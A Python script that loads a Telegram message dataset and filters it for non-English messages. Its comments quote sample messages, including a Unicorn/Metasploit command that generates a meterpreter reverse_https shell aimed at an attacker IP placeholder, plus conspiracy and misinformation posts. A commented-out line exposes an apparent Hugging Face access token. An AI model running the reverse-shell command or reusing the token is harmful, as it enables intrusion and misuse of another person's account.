import pandas as pd
from huggingface_hub import login
from datasets import load_dataset, DatasetDict, Dataset
import re
from tqdm import tqdm
tqdm.pandas()

#login(token="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")

INPUT_PATH = "/scratch/usr/nimtsspi/datasets/TG"
OUTPUT_PATH = "/scratch/usr/nimtsspi/datasets/TG"

# df = pd.read_parquet(f"{OUTPUT_PATH}/TG_280limit.parquet")

# #ref = "This link was deemed abusive and disallowed"
# #ref = "@user(Tsuchi)-941974306 `Mさん🐍・https -t.co_QN7pA1mYm7.mp4 ` Info: 498x498 113.4KiB 1s #gif #dhole"
# #ref="This change will be done so that transgender people are not offended. Read Now: https:// unitynewsnetwork.co.uk/nhs-trust-hospital-instructs-midwives-told-to-stop-using-terms-such-as-breastfeeding-and-breastmilk/"

# # ref = "There are new silver and black color options"
# # print(df[df.message.str.contains(ref)].message.to_list())
# ref ="watch?v=G2qIXXafxCQ"
# ref = "Additional Qlinks: https:// www.cia.gov/library/readingroom/docs/DOC_0006687262.pdf"
# ref = "rump rips George W. Bush:"
# print(df[df.message.str.contains(ref, regex=True, na=False)].message.to_list())


#@user DURHAM/HRC https:// www.reuters.com/article/us-usa-congress-sextrafficking/trump-signs-law-to-punish-websites-for-sex-trafficking-idUSKBN1HI2KP Study carefully. Facebook. IG (think Ray.Chandler). Twitter. Etc….. HONEYPOTS. Q @user @user

#@user: There are new silver and black color options for the Magic Keyboard with Touch ID, Magic Trackpad and Magic Mouse. https…
#5.:Unicorn will use the Metasploit reverse_https module to connect to the attackers IP address using the specified port. @user
#6.:./unicorn.py windows/meterpreter/reverse_https gtATTACKER-IP-ADDRESSlt gtPORTlt
#把一个放到MySQL里的JSON中的http换成https居然挺难的 简直是对斜杠的终极考验 啊哈哈「分享自」
#Network:Allnet Speed:2MBPS Type of file:BTC Join my channel For more @user Feedback with a screenshot @user Group chathttps: //t.me/joinchat/OmnxUhVd0rUkNnJnbRFe1Q
#This link was deemed abusive and disallowed. Lol So we must break it up... https:// www. naturalnews. com/2021-06-28-dandelion-leaf-extract-blocks-spike-proteins-binding-to-ace2-receptor. html




df = pd.read_parquet(f"{OUTPUT_PATH}/TG_unified.parquet")
print(len(df))
# print(df.language.value_counts())
# print(df.language.unique())

# df = df[(df.language != "LangDetectError") & (df.language != "en")]
# print(len(df))
# print(df.message.to_list()[:10])
cjk_pattern = re.compile(r'^[\u3040-\u30FF\u3400-\u4DBF\u4E00-\u9FFF]+$') #22537
#cjk_pattern = re.compile(r'[\u4E00-\u9FFF]')
#cjk_pattern = re.compile(r'^[\u4E00-\u9FFF]+$')^#20568
non_english = re.compile(r'^[^\x00-\x7F]+$')

df = df[df.message.str.contains(non_english, regex=True, na=False)]
print(len(df))
print(df.sample(100).message.to_list()[:100])
